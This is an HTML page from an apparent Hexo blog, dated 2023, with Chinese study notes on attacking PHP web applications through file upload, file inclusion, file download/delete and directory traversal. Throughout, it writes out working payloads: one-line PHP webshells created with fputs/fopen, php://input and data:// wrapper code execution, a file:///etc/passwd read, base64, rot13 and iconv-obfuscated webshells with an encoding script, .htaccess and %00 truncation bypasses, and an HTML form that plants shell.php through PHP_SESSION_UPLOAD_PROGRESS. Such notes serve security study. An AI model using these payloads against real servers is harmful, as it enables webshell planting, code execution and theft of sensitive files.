@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        
+    
+    <link rel='stylesheet' href="/./css/dracula.css">
+
+        <title>Web攻防-PHP应用-文件类</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=2.0">
+<link rel="stylesheet" href="/css/style.css">
+<link rel="shortcut icon" href="/favicon.ico">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="manifest" href="/site.webmanifest">
+
+    <meta name="generator" content="Hexo 6.3.0"></head>
+    <body>
+        <header class="al_header al_pos_fixed">
+    <div class="al_header_container dis_flex_jcenter">
+        <div class="al_header_container_left">
+            <div class="al_header_site_title">
+                <a href="/">Hexo</a>
+            </div>
+        </div>
+
+        <div class="dis_flex_jcenter">
+            <div class="al_header_setting">
+                <svg class="al_header_icon">
+                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-menu"></use>
+                </svg>
+            </div>
+        </div>
+    </div>
+</header>
+
+        <div class="al_sidebar">
+
+    <div class="al_sidebar_overlay al_full_cover"></div>
+
+    <div class="al_pos_fixed al_sidebar_cnt">
+        <div class="dis_flex_acenter al_sidebar_header">
+            <h3>Hexo</h3>
+            <div class="al_sidebar_close al_header_setting">
+                <svg class="al_header_icon">
+                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-close"></use>
+                </svg>
+            </div>
+        </div>
+
+        <div class="al_sidebar_author_cnt">
+
+            <div class="al_sidebar_author_info">
+                <h4>John Doe</h4>
+                <img class="al_sidebar_avatar" src="https://yourAvatorURL">
+                <p></p>
+            </div>
+
+            
+        </div>
+    </div>
+</div>
+
+        
+    <div class="dis_flex_center al_lightbox_cnt al_full_cover">
+        <img class="al_lightbox_img"/>
+    </div>
+    <div class="al_page_background dis_flex_center al_full_cover"></div>
+    <div class="al_page_container">
+        <div class="al_pos_ab al_fake_background"></div>
+        <div class="al_main_container al_shadow al_main_page_container">
+            <article class="al_article">
+                <header>
+                    <h1 class="al_page_title">
+                        Web攻防-PHP应用-文件类
+                    </h1>
+                    <div class="al_page_info dis_flex">
+                        <div class="al_page_content_info">
+                            Wed September 13, 2023 03:18 PM
+                        </div>
+
+                        
+
+                        
+                        <span class="tags"></span>
+                    </div>
+                </header>
+
+                
+                    <div class="al_page_content_outline">
+                        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%94%9F%E6%80%81"><span class="toc-text">原生态</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AFJS"><span class="toc-text">前端JS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess"><span class="toc-text">.htaccess</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MIME"><span class="toc-text">MIME</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E5%88%A4%E6%96%AD"><span class="toc-text">文件头判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81"><span class="toc-text">黑名单验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%8E%E7%89%88%E6%9C%ACGET-00%E6%88%AA%E6%96%AD"><span class="toc-text">低版本GET-%00截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%8E%E7%89%88%E6%9C%ACPOST-00%E6%88%AA%E6%96%AD"><span class="toc-text">低版本POST-%00截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E4%B8%8D%E4%B8%A5-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-text">逻辑不严-条件竞争</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93"><span class="toc-text">二次渲染</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#move-uploaded-file%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7"><span class="toc-text">move_uploaded_file函数缺陷</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%93%E5%B1%95%E7%B1%BB"><span class="toc-text">拓展类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E7%B1%BB"><span class="toc-text">安全架构类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90%E6%96%B9%E6%A1%88"><span class="toc-text">解析方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E6%96%B9%E6%A1%88"><span class="toc-text">存储方案</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-text">分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%9C%89%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-text">判断是否有文件包含漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB"><span class="toc-text">本地包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB"><span class="toc-text">远程包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB-%E6%97%A0%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">本地包含-无文件利用-伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E7%BC%96%E7%A0%81"><span class="toc-text">特殊编码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB-%E6%97%A0%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8-%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="toc-text">本地包含-无文件利用-日志包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB-%E6%97%A0%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8-sesssion%E6%96%87%E4%BB%B6"><span class="toc-text">本地包含-无文件利用-sesssion文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-amp-%E8%AF%BB%E5%8F%96-amp-%E5%88%A0%E9%99%A4"><span class="toc-text">文件下载&amp;读取&amp;删除</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD-x3D-%E8%AF%BB%E5%8F%96"><span class="toc-text">下载&#x3D;读取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4"><span class="toc-text">文件删除</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%91%E7%9B%92%E5%88%86%E6%9E%90"><span class="toc-text">黑盒分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E7%9B%92%E5%88%86%E6%9E%90"><span class="toc-text">白盒分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E5%AE%89%E5%85%A8"><span class="toc-text">目录安全</span></a></li></ol>
+                    </div>
+                
+
+                
+                <section id="post-body">
+                    <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>文件上传安全指的是：攻击者通过利用上传实现后门的写入连接后门进行权限控制的安全问题，对于如何确保这类安全问题，一般会从原生态功能中的<strong>文件内容</strong>，<strong>文件后缀</strong>，<strong>文件类型</strong>等方面判断，但是漏洞可能不仅在本身的代码验证逻辑中出现安全问题，也会在<strong>语言版本</strong>，<strong>语言函数</strong>，<strong>中间件</strong>，引用的<strong>第三方编辑器</strong>等存在缺陷地方配合利用。另外文件上传也有多个<strong>存储逻辑</strong>，不同的文件存储方案也有不同的攻击思路</p>
+<h2 id="原生态"><a href="#原生态" class="headerlink" title="原生态"></a>原生态</h2><h3 id="前端JS"><a href="#前端JS" class="headerlink" title="前端JS"></a>前端JS</h3><p>如何判断：</p>
+<ol>
+<li>直接看网页js代码，看看是不是有验证文件上传的功能（方便，但是需要一些代码审计能力）</li>
+<li>抓包验证，如果在抓到数据包之前就提示文件上传失败，那大概率就是前端验证了</li>
+</ol>
+<p>绕过方法：可以直接修改验证代码，或者直接禁用js即可</p>
+<h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p> <em>htaccess 文件是 Apache 服务器中的一个<strong>配置文件</strong>，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现：网页301重定向、自定义 404 错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</em></p>
+<p><code>AddType application/x-httpd-php .png</code>：把png格式的文件，当成php来执行。先上传一个图片格式的文件，抓包，把文件内容和名字改成上面的内容。再上传一个写了木马的png后缀文件，即可连接。</p>
+<h3 id="MIME"><a href="#MIME" class="headerlink" title="MIME"></a>MIME</h3><p><em>媒体类型（通常称为Multipurpose Internet Mail Extensions 或 MIME 类型 ）是一种标准，用来表示文档、文件或字节流的性质和格式。</em>            </p>
+<p><em>MIME的组成结构非常简单；由类型与子类型两个字符串中间用 ‘&#x2F;‘ 分隔而组成。不允许空格存在。type 表示可以被分多个子类的独立类别。subtype 表示细分后的每个类型。</em><br> <em>通用的结构为：<code>type/subtype</code></em></p>
+<p><em>MIME类型对大小写不敏感，但是传统写法都是小写。</em></p>
+<p>绕过方法：</p>
+<ol>
+<li>上传写有木马的图片格式文件，抓包后修改文件后缀</li>
+<li>上传木马文件，抓包后修改MIME为<code>Content-Type：image/png</code></li>
+</ol>
+<h3 id="文件头判断"><a href="#文件头判断" class="headerlink" title="文件头判断"></a>文件头判断</h3><p>有些代码是通过判断文件头信息是不是属于图片类型来验证的</p>
+<p>绕过方法：在木马文件内容前面加上<code>GIF89a</code>（gif文件头），一般这个验证还带有MIME检测，抓包修改下Content-Type</p>
+<h3 id="黑名单验证"><a href="#黑名单验证" class="headerlink" title="黑名单验证"></a>黑名单验证</h3><p>设置一个黑名单，限制什么后缀无法上传</p>
+<ul>
+<li>无递归，用双写：pphphp</li>
+<li>使用大小写绕过，windows可以大小写混合，linux只能全大写或者全小写</li>
+<li>用php3，phtml等</li>
+</ul>
+<h3 id="低版本GET-00截断"><a href="#低版本GET-00截断" class="headerlink" title="低版本GET-%00截断"></a>低版本GET-%00截断</h3><p>00截断是操作系统层的漏洞，由于操作系统是C语言或汇编语言编写的，这两种语言在定义字符串时，都是以\0（即0x00）作为字符串的结尾。操作系统在识别字符串时，当读取到\0字符时，就认为读取到了一个字符串的结束符号。00截断通常用来绕过<strong>白名单</strong>限制。</p>
+<p>要求：</p>
+<ul>
+<li><p>magic_quotes_gpc &#x3D; Off</p>
+</li>
+<li><p>PHP 版本小于 5.3.4</p>
+<p>判断php版本方法：抓包发包，看返回包的X-Powered-By，有时候会显示php版本</p>
+</li>
+</ul>
+<p>使用方法：抓包，有路径修改路径，没路径修改文件名</p>
+<p>eg：路径：<code>/var/www/html/upload/</code>,文件名：<code>1.jpg</code>。我们修改路径为<code>/var/www/html/upload/z.php%00</code>，代码验证文件时，是用文件名验证，jpg验证通过后，拼接路径和文件名成：<code>/var/www/html/upload/z.php%001.jpg</code>，截断后变成&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;z.php，就把原本1.jpg命名成z.php文件上传成功了</p>
+<h3 id="低版本POST-00截断"><a href="#低版本POST-00截断" class="headerlink" title="低版本POST-%00截断"></a>低版本POST-%00截断</h3><p>原理要求使用方法同上，但是修改路径时，要用bp里的解码功能，把<code>%00</code>url解码一次。因为00截断本质上是%00url解码一次后导致的结果，在get型，即在url输入特殊字符时，浏览器会自动解码一次。所以get型可以直接输入%00，浏览器自动解码一次。而post型没有自动解码功能，我们要手动解码一次才行</p>
+<h3 id="逻辑不严-条件竞争"><a href="#逻辑不严-条件竞争" class="headerlink" title="逻辑不严-条件竞争"></a>逻辑不严-条件竞争</h3><p>逻辑缺陷：先上传，再判断是否合法，不合法删除。所以从上传到删除之间还是有一段时间，在这一段时间内如果我们访问了新上传的php文件，这个文件就能被执行</p>
+<p>使用方法：写一个php文件<code>&lt;?php fputs(fopen(&#39;xiao.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_REQUEST[1]);?&gt;&#39;);?&gt;</code>。他的含义是创建一个xiao.php文件，写入一句话木马。我们要趁还未删除的时候访问，可以利用burpsuite的爆破功能，创建两个任务，一个是上传php文件，一个是访问我们刚刚上传的文件。然后我们手工多次访问xiao.php文件，直到成功访问。</p>
+<h3 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h3><p>很多网站都会对用户上传的图片再次压缩、裁剪等渲染操作。普通的图片的内容有可能被修改过，如果我们之间把木马写在里面，也有可能被修改。</p>
+<p>绕过方法：先上传一个正常的图片，把上传后的文件下载出来，用010和原图片进行比较（工具-&gt;比较），在没有被修改过的地方写入木马，再上传，利用文件包含漏洞执行php代码即可</p>
+<h3 id="move-uploaded-file函数缺陷"><a href="#move-uploaded-file函数缺陷" class="headerlink" title="move_uploaded_file函数缺陷"></a>move_uploaded_file函数缺陷</h3><p>语法：move_uploaded_file(file,newloc)<br>参数：<br>●　file：必需。规定要移动的文件。<br>●　newloc：必需。规定文件的新位置。</p>
+<p>条件：newloc由我们输入且使用黑名单验证newloc</p>
+<p>使用方法：我们上传一个写着木马的图片文件，再在保存的文件名的地方写上<code>1.php/.</code>,由于<code>php/.</code>肯定不在黑名单里，可以绕过黑名单验证，而move_uploaded_file函数解析的时候会忽略<code>/.</code>,所以会以<code>1.php</code>为文件名保存</p>
+<h2 id="拓展类"><a href="#拓展类" class="headerlink" title="拓展类"></a>拓展类</h2><ul>
+<li><p>中间件：Web搭建在存在漏洞的中间件上，漏洞影响这文件的解析即配合上传</p>
+</li>
+<li><p>编辑器：引用到外部的第三方编辑器实现文件上传（eg：ueditor），编辑器的漏洞即是上传漏洞</p>
+</li>
+<li><p>CMS：已知CMS源码架构，利用已知的漏洞测试</p>
+<p>这里的一二点已知漏洞不多，而且有严格的版本要求，加上必须有文件上传模块，还有些已经打过补丁，所以实战中利用可能很低。第三点还是有点可能的</p>
+</li>
+</ul>
+<h2 id="安全架构类"><a href="#安全架构类" class="headerlink" title="安全架构类"></a>安全架构类</h2><h3 id="解析方案"><a href="#解析方案" class="headerlink" title="解析方案"></a>解析方案</h3><ol>
+<li><p>执行权限：文件上传后存储目录不给解析权限。无法解析也就无法使用木马文件。</p>
+<ul>
+<li>判断方法：访问我们上传的脚本文件，显示403</li>
+<li>绕过方法：设置解析权限只会给某一些目录，可以上传到其他目录就可以执行了，但是难度很大。</li>
+</ul>
+</li>
+<li><p>解码还原：上传图片自动编码（一般是base64），不存储图片，只存编码值。在调用的时候固定协议解码还原数据。固定协议（data:image&#x2F;png:base64)的意思是将这串代码当作png来解析，即使上传的是php后缀文件，也只能当图片来解析</p>
+<ul>
+<li><p>判断方法：看存储图片的路径</p>
+<p><img src="/2023/09/13/Web%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8-%E6%96%87%E4%BB%B6%E7%B1%BB/19.jpg" alt="19"></p>
+</li>
+<li><p>绕过方法：无法绕过</p>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="存储方案"><a href="#存储方案" class="headerlink" title="存储方案"></a>存储方案</h3><ol>
+<li>分站存储：<code>upload.znskiw.com</code> 上传，<code>images.znskiw.com</code> 存储。我们最多只能控制存储网站，由于用来存储的网站只用于存储图片，并没有什么用，所以攻击意义不大、<ul>
+<li>判断方法：看存储路径的域名和当前域名是否一致</li>
+</ul>
+</li>
+<li>OSS存储：直接把文件存到那些大型公司的oss上，几乎无法攻击<ul>
+<li>判断方法：看存储路径的url，一般oss存储的域名都带有oss</li>
+</ul>
+</li>
+</ol>
+<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无须再次编写，这种调用文件的过程一般被称为文件包含。在包含文件的过程中，如果文件能进行控制，则存储文件包含漏洞</p>
+<p>比如前面安全开发的时候，先写一个config.php文件来连接数据库，以后要使用的时候，直接<code>include &#39;config.php&#39;</code></p>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>本地包含-Local File Include-LFI</p>
+<p>远程包含-Remote File Include-RFI（要求php.ini里的allow_url_include要开启，php高版本默认关闭）</p>
+<h2 id="判断是否有文件包含漏洞"><a href="#判断是否有文件包含漏洞" class="headerlink" title="判断是否有文件包含漏洞"></a>判断是否有文件包含漏洞</h2><p>-白盒发现：</p>
+<p>1、可通过应用功能追踪代码定位审计</p>
+<p>2、可通过脚本特定函数搜索定位审计</p>
+<p>PHP：include、require、include_once、require_once等</p>
+<p>include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行</p>
+<p>require函数出现错误的时候，会直接报错并退出程序的执行</p>
+<p>Java：java.io.File、java.io.FileReader等</p>
+<p>ASP.NET：System.IO.FileStream、System.IO.StreamReader等</p>
+<p>-黑盒发现：</p>
+<p>主要观察参数传递的数据和文件名是否对应</p>
+<p>URL中有path、dir、file、pag、page、archive、p、eng、语言文件等相关字眼</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><ul>
+<li>有文件利用：配合文件上传漏洞</li>
+<li>无文件利用：<ol>
+<li>伪协议利用</li>
+<li>包含日志文件利用</li>
+<li>包含session文件利用</li>
+</ol>
+</li>
+</ul>
+<h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>直接搭建一个可以访问的远程url包含文件</p>
+<h3 id="本地包含-无文件利用-伪协议"><a href="#本地包含-无文件利用-伪协议" class="headerlink" title="本地包含-无文件利用-伪协议"></a>本地包含-无文件利用-伪协议</h3><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/unexpectedthing/article/details/121276653">https://blog.csdn.net/unexpectedthing/article/details/121276653</a></p>
+<p><img src="/2023/09/13/Web%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8-%E6%96%87%E4%BB%B6%E7%B1%BB/18.png" alt="18"></p>
+<ul>
+<li>文件读取：</li>
+</ul>
+<p><code>file:///etc/passwd</code>（要求必须是绝对路径）</p>
+<p>&#96;&#96;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;phpinfo.php&#96;（要求比较低，可以是相对路径）</p>
+<ul>
+<li>文件写入：</li>
+</ul>
+<p><code>php://filter/write=convert.base64-encode/resource=phpinfo.php</code>【要求要有如下代码：file_put_contents($a,$b),a传参上面代码，b传参文件内容】</p>
+<p><code>php://input</code> <code>POST:&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;); ?&gt;</code></p>
+<ul>
+<li>代码执行：</li>
+</ul>
+<p><code>php://input POST:&lt;?php phpinfo();?&gt;</code></p>
+<p><code>data://text/plain,&lt;?php phpinfo();?&gt;</code></p>
+<p><code>data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></p>
+<h4 id="特殊编码"><a href="#特殊编码" class="headerlink" title="特殊编码"></a>特殊编码</h4><ul>
+<li><p>有时候要使用base64编码时，过滤了+或者&#x3D;，在base64中很有可能出现的字符，我们可以把木马前后加一些字符即可绕过。比如<code>&lt;?php system(&#39;tac *.php&#39;);echo 123;?&gt;ad</code>的base64编码是：<code>PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTtlY2hvIDEyMzs/PmFk</code>,就不带有&#x3D;了</p>
+</li>
+<li><p>凯撒13：<code>php://filter/write=string.rot13/resource=2.php</code></p>
+</li>
+</ul>
+<p><code>post:content=&lt;?cuc riny($_CBFG[k]);?&gt;</code>(这里的k是x编码后)</p>
+<ul>
+<li>convert.iconv：<code>file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php``post:contents=?&lt;hp pvela$(P_SO[T]a;)&gt;?</code></li>
+</ul>
+<p>加密脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$result = iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;, &#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;);</span><br><span class="line">echo &quot;经过一次反转:&quot;.$result.&quot;\n&quot;;</span><br><span class="line">echo &quot;经过第二次反转:&quot;.iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;, $result);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="本地包含-无文件利用-日志包含"><a href="#本地包含-无文件利用-日志包含" class="headerlink" title="本地包含-无文件利用-日志包含"></a>本地包含-无文件利用-日志包含</h3><p>网站都有带有日志文件，储存着访问信息。大多数默认都在<code>/var/log/nginx/access.log</code>路径下(不同系统和中间件有差别)。</p>
+<p><img src="/2023/09/13/Web%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8-%E6%96%87%E4%BB%B6%E7%B1%BB/20.jpg" alt="20">，里面有记录访问者的ua信息。我们可以访问时抓包，修改ua头为攻击语句，然后再使用文件包含包含日志文件，即可执行在ua头插入的攻击语句</p>
+<h3 id="本地包含-无文件利用-sesssion文件"><a href="#本地包含-无文件利用-sesssion文件" class="headerlink" title="本地包含-无文件利用-sesssion文件"></a>本地包含-无文件利用-sesssion文件</h3><p>利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含，在安全开发的时候，学过要使用session的时候要在提前在代码设置好。但是PHP_SESSION_UPLOAD_PROGRESS可以在没有代码设置的情况下也能设置session。在设置session后，会把session文件记录在&#x2F;tem目录下（不同系统和中间件不同），但是服务器会把session文件内容清空。</p>
+<p>我们先创建并访问如下html文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://xxxx.com/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[1])?&gt;&#x27;?&gt;&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>随便上传一个文件，抓包修改cookie（没有就加一个），<code>Cookie：PHPSESSID=znskiw</code>,然后就会生成一个<code>/tmp/sess_znskiw</code>文件，我们只要包含下这个文件，即可执行php代码，写入一句话木马，但是文件内容会被快速删除，这时可以用文件上传条件竞争的思路，使用爆破，一个不停上传session文件，一个一直访问包含<code>/tmp/sess_znskiw</code>文件的网址。直到访问到shell.php成功上传</p>
+<h1 id="文件下载-amp-读取-amp-删除"><a href="#文件下载-amp-读取-amp-删除" class="headerlink" title="文件下载&amp;读取&amp;删除"></a>文件下载&amp;读取&amp;删除</h1><h2 id="下载-x3D-读取"><a href="#下载-x3D-读取" class="headerlink" title="下载&#x3D;读取"></a>下载&#x3D;读取</h2><p>常规下载URL（直连地址）：<a target="_blank" rel="noopener" href="http://www.xiaodi8.com/upload/1.php%EF%BC%88%E4%BC%9A%E8%A7%A3%E6%9E%90php%EF%BC%8C%E7%9C%8B%E4%B8%8D%E5%88%B0%E6%BA%90%E7%A0%81%E3%80%82%E5%8F%AA%E4%BC%9A%E4%B8%8B%E8%BD%BD%E5%BA%94%E8%AF%A5%E8%A6%81%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%8D%8F%E8%AE%AE%EF%BC%8Ceg%EF%BC%9Azip%EF%BC%89">http://www.xiaodi8.com/upload/1.php（会解析php，看不到源码。只会下载应该要下载的协议，eg：zip）</a></p>
+<p>可能存在安全URL：<a target="_blank" rel="noopener" href="http://www.xiaodi8.com/xx.xx?file=1.php%EF%BC%88%E4%BC%9A%E4%B8%8B%E8%BD%BD%E6%89%80%E6%9C%89%E5%8D%8F%E8%AE%AE%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%89">http://www.xiaodi8.com/xx.xx?file=1.php（会下载所有协议的文件）</a></p>
+<p>利用：常规下载敏感文件（数据库配置，中间件配置，系统密匙等文件信息）</p>
+<h2 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h2><p>有问题的url同上</p>
+<p>常出现后台中</p>
+<h2 id="黑盒分析"><a href="#黑盒分析" class="headerlink" title="黑盒分析"></a>黑盒分析</h2><p>1、功能点</p>
+<p>文件上传，文件下载，文件删除，文件管理器等地方</p>
+<p>2、URL特征</p>
+<p>文件名：</p>
+<p>download，down，readfile，read，del，dir，path，src，Lang等</p>
+<p>参数名：</p>
+<p>file、path、data、filepath、readfile、data、url、realpath等</p>
+<h2 id="白盒分析"><a href="#白盒分析" class="headerlink" title="白盒分析"></a>白盒分析</h2><p>上传类函数，删除类函数，下载类函数</p>
+<h1 id="目录安全"><a href="#目录安全" class="headerlink" title="目录安全"></a>目录安全</h1><p>1、目录遍历</p>
+<p>目录权限控制不当，通过遍历获取到有价值的信息文件去利用</p>
+<p><img src="/2023/09/13/Web%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8-%E6%96%87%E4%BB%B6%E7%B1%BB/2.png" alt="2"></p>
+<p>这个没什么好说的，打开网站有就是有，没有就是没有</p>
+<p>2、目录穿越（常出现后台中）</p>
+<p>目录权限控制不当，通过控制查看目录路径穿越到其他目录。黑盒URL特征和上面文件下载&amp;读取&amp;删除一样</p>
+
+                </section>
+
+                
+                
+
+                
+
+            </article>
+
+            
+            <nav class="dis_flex al_post_nav">
+                <a class="al_post_nav_item dis_flex_acenter" href="/">
+                    
+                </a>
+                <a class="al_post_nav_item dis_flex_acenter" href="/2023/08/29/Web%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8-SQL%E6%B3%A8%E5%85%A5/">
+                    
+                        <span class="al_text_ellipsis al_post_nav_desc">Web攻防-PHP应用-SQL注入</span>
+                        <svg class="al_arrow">
+                            <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-arrow-right"></use>
+                        </svg>
+                    
+                </a>
+            </nav>
+        </div>
+    </div>
+
+
+        <div class="al_index_footer dis_flex_center">
+    <div class="al_index_footer_item al_index_footer_title">
+        John Doe
+    </div>
+
+    
+    
+
+    <div class="al_index_footer_item al_index_footer_extra">
+        Created By 
+        <a target="_blank" rel="noopener" href="https://github.com/iGuan7u/Acetolog">AcetoLog</a>
+         · Power By 
+        <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
+    </div>
+
+    <div class="al_index_footer_item al_index_footer_extra_right">
+        All Right Reserved
+    </div>
+</div>
+
+        <script type="text/javascript" async="async" src="/javascripts/acelog.js"></script>
+        
+        
+        
+        
+        
+
+    </body>
+</html>
